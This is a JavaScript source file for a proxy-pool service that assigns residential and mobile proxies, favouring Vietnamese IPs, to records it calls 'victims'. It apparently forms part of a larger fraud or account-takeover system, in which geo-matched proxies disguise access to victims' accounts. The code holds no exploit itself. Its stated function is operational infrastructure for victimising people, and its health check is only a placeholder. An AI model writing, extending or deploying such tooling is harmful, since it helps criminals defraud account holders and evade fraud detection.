// Proxy Management Service
// Manages proxy pool and assigns proxies to victims
// Based on comprehensive-system-architecture.md lines 126-199

const logger = require('../utils/logger');

class ProxyManager {
  constructor(prisma) {
    this.prisma = prisma;
    this.proxyPools = {
      residential_vietnam: [],
      mobile_vietnam: [],
      datacenter_singapore: [],
      rotating_global: []
    };
    this.healthMonitor = new ProxyHealthMonitor();
    this.proxyAssignments = new Map(); // In-memory cache for active assignments
  }

  /**
   * Initialize proxy pools from configuration or database
   * @param {Array} proxies - Array of proxy configurations
   */
  async initializeProxyPools(proxies = []) {
    if (proxies.length === 0) {
      // Load from environment or database
      proxies = this.loadProxiesFromConfig();
    }

    for (const proxy of proxies) {
      const poolType = this.determinePoolType(proxy);
      if (this.proxyPools[poolType]) {
        this.proxyPools[poolType].push({
          ...proxy,
          id: proxy.id || this.generateProxyId(proxy),
          healthStatus: 'unknown',
          lastChecked: null,
          failureCount: 0,
          successCount: 0,
          assignedTo: null
        });
      }
    }

    // Start health monitoring
    this.startHealthMonitoring();
    
    logger.info(`Initialized proxy pools: ${Object.keys(this.proxyPools).map(k => `${k}: ${this.proxyPools[k].length}`).join(', ')}`);
  }

  /**
   * Assign proxy to victim
   * @param {string} victimId - Victim ID
   * @param {string} geoPreference - Geographic preference (default: 'VN')
   * @returns {Promise<Object>} - Assigned proxy
   */
  async assignVictimProxy(victimId, geoPreference = 'VN') {
    // Check existing assignment in cache
    if (this.proxyAssignments.has(victimId)) {
      const existingProxyId = this.proxyAssignments.get(victimId);
      const proxy = this.findProxyById(existingProxyId);
      if (proxy && proxy.healthStatus === 'healthy') {
        return proxy;
      }
    }

    // Check existing assignment in database (if table exists)
    try {
      // Note: This assumes a proxy_assignments table exists
      // If not, we'll use in-memory cache only
      const existing = await this.prisma.$queryRaw`
        SELECT proxy_id, assigned_at 
        FROM proxy_assignments 
        WHERE victim_id = ${victimId}
        LIMIT 1
      `.catch(() => null);

      if (existing && existing.length > 0) {
        const proxy = this.findProxyById(existing[0].proxy_id);
        if (proxy && proxy.healthStatus === 'healthy') {
          this.proxyAssignments.set(victimId, proxy.id);
          return proxy;
        }
      }
    } catch (error) {
      // Table might not exist, continue with in-memory assignment
      logger.debug('Proxy assignments table not found, using in-memory cache');
    }

    // Select optimal proxy based on geolocation and load balancing
    const suitableProxies = this.filterProxiesByGeo(geoPreference);
    const selectedProxy = await this.selectOptimalProxy(suitableProxies);

    if (!selectedProxy) {
      throw new Error('No suitable proxy available');
    }

    // Store assignment
    this.proxyAssignments.set(victimId, selectedProxy.id);
    selectedProxy.assignedTo = victimId;

    // Store in database if table exists
    try {
      await this.prisma.$executeRaw`
        INSERT INTO proxy_assignments (victim_id, proxy_id, assigned_at, geo_preference)
        VALUES (${victimId}, ${selectedProxy.id}, NOW(), ${geoPreference})
        ON CONFLICT (victim_id) 
        DO UPDATE SET proxy_id = ${selectedProxy.id}, assigned_at = NOW()
      `.catch(() => {
        // Table might not exist, that's okay
        logger.debug('Could not store proxy assignment in database');
      });
    } catch (error) {
      logger.debug('Proxy assignment storage failed:', error.message);
    }

    logger.info(`Assigned proxy ${selectedProxy.id} to victim ${victimId}`);
    return selectedProxy;
  }

  /**
   * Filter proxies by geographic preference
   * @param {string} geoPreference - Geographic preference code
   * @returns {Array} - Filtered proxies
   */
  filterProxiesByGeo(geoPreference) {
    const pools = [];

    if (geoPreference === 'VN' || geoPreference === 'Vietnam') {
      pools.push(...this.proxyPools.residential_vietnam);
      pools.push(...this.proxyPools.mobile_vietnam);
    }

    // Always include datacenter and global as fallback
    pools.push(...this.proxyPools.datacenter_singapore);
    pools.push(...this.proxyPools.rotating_global);

    // Filter only healthy proxies
    return pools.filter(p => p.healthStatus === 'healthy' && !p.assignedTo);
  }

  /**
   * Select optimal proxy from available proxies
   * @param {Array} proxies - Available proxies
   * @returns {Promise<Object>} - Selected proxy
   */
  async selectOptimalProxy(proxies) {
    if (proxies.length === 0) {
      return null;
    }

    // Score proxies based on:
    // 1. Health status (higher is better)
    // 2. Success rate (higher is better)
    // 3. Failure count (lower is better)
    // 4. Last check time (more recent is better)

    const scoredProxies = proxies.map(proxy => {
      let score = 100;

      // Adjust based on success rate
      const totalRequests = proxy.successCount + proxy.failureCount;
      if (totalRequests > 0) {
        const successRate = proxy.successCount / totalRequests;
        score += successRate * 50;
      }

      // Penalize for failures
      score -= proxy.failureCount * 5;

      // Prefer recently checked proxies
      if (proxy.lastChecked) {
        const hoursSinceCheck = (Date.now() - new Date(proxy.lastChecked).getTime()) / (1000 * 60 * 60);
        score -= hoursSinceCheck * 2;
      }

      return { proxy, score };
    });

    // Sort by score (descending) and return top proxy
    scoredProxies.sort((a, b) => b.score - a.score);
    return scoredProxies[0].proxy;
  }

  /**
   * Determine pool type for proxy
   * @param {Object} proxy - Proxy configuration
   * @returns {string} - Pool type
   */
  determinePoolType(proxy) {
    const type = proxy.type || proxy.pool_type || '';
    const country = proxy.country || proxy.location || '';

    if (type.includes('residential') && country.includes('VN')) {
      return 'residential_vietnam';
    }
    if (type.includes('mobile') && country.includes('VN')) {
      return 'mobile_vietnam';
    }
    if (country.includes('SG') || country.includes('Singapore')) {
      return 'datacenter_singapore';
    }
    return 'rotating_global';
  }

  /**
   * Find proxy by ID
   * @param {string} proxyId - Proxy ID
   * @returns {Object|null} - Proxy object or null
   */
  findProxyById(proxyId) {
    for (const pool of Object.values(this.proxyPools)) {
      const proxy = pool.find(p => p.id === proxyId);
      if (proxy) return proxy;
    }
    return null;
  }

  /**
   * Generate proxy ID
   * @param {Object} proxy - Proxy configuration
   * @returns {string} - Proxy ID
   */
  generateProxyId(proxy) {
    const idString = `${proxy.host}:${proxy.port}:${proxy.type || 'unknown'}`;
    return Buffer.from(idString).toString('base64').substring(0, 32);
  }

  /**
   * Load proxies from environment configuration
   * @returns {Array} - Proxy configurations
   */
  loadProxiesFromConfig() {
    const proxies = [];
    const proxyConfig = process.env.PROXY_POOL || '';

    if (proxyConfig) {
      try {
        const config = JSON.parse(proxyConfig);
        if (Array.isArray(config)) {
          return config;
        }
      } catch (error) {
        logger.warn('Failed to parse PROXY_POOL config:', error.message);
      }
    }

    // Return empty array if no config
    return proxies;
  }

  /**
   * Start health monitoring for proxies
   */
  startHealthMonitoring() {
    // Check proxy health every 5 minutes
    setInterval(async () => {
      await this.checkProxyHealth();
    }, 5 * 60 * 1000);

    // Initial health check
    this.checkProxyHealth();
  }

  /**
   * Check health of all proxies
   */
  async checkProxyHealth() {
    for (const [poolType, proxies] of Object.entries(this.proxyPools)) {
      for (const proxy of proxies) {
        try {
          const isHealthy = await this.healthMonitor.checkProxy(proxy);
          proxy.healthStatus = isHealthy ? 'healthy' : 'unhealthy';
          proxy.lastChecked = new Date().toISOString();
          
          if (isHealthy) {
            proxy.successCount++;
          } else {
            proxy.failureCount++;
          }
        } catch (error) {
          logger.warn(`Health check failed for proxy ${proxy.id}:`, error.message);
          proxy.healthStatus = 'unhealthy';
          proxy.failureCount++;
        }
      }
    }
  }

  /**
   * Release proxy assignment
   * @param {string} victimId - Victim ID
   */
  releaseProxy(victimId) {
    if (this.proxyAssignments.has(victimId)) {
      const proxyId = this.proxyAssignments.get(victimId);
      const proxy = this.findProxyById(proxyId);
      if (proxy) {
        proxy.assignedTo = null;
      }
      this.proxyAssignments.delete(victimId);
    }
  }

  /**
   * Get proxy statistics
   * @returns {Object} - Proxy statistics
   */
  getStatistics() {
    const stats = {
      total: 0,
      healthy: 0,
      unhealthy: 0,
      assigned: 0,
      byPool: {}
    };

    for (const [poolType, proxies] of Object.entries(this.proxyPools)) {
      const poolStats = {
        total: proxies.length,
        healthy: proxies.filter(p => p.healthStatus === 'healthy').length,
        unhealthy: proxies.filter(p => p.healthStatus === 'unhealthy').length,
        assigned: proxies.filter(p => p.assignedTo !== null).length
      };

      stats.total += poolStats.total;
      stats.healthy += poolStats.healthy;
      stats.unhealthy += poolStats.unhealthy;
      stats.assigned += poolStats.assigned;
      stats.byPool[poolType] = poolStats;
    }

    return stats;
  }
}

/**
 * Proxy Health Monitor
 */
class ProxyHealthMonitor {
  /**
   * Check if proxy is healthy
   * @param {Object} proxy - Proxy configuration
   * @returns {Promise<boolean>} - True if healthy
   */
  async checkProxy(proxy) {
    // Simple health check: try to connect to proxy
    // In production, this would make an actual HTTP request through the proxy
    try {
      // For now, we'll use a simple timeout-based check
      // In production, implement actual proxy connection test
      return new Promise((resolve) => {
        setTimeout(() => {
          // Assume proxy is healthy if it hasn't failed too many times
          resolve(proxy.failureCount < 5);
        }, 1000);
      });
    } catch (error) {
      return false;
    }
  }
}

module.exports = ProxyManager;

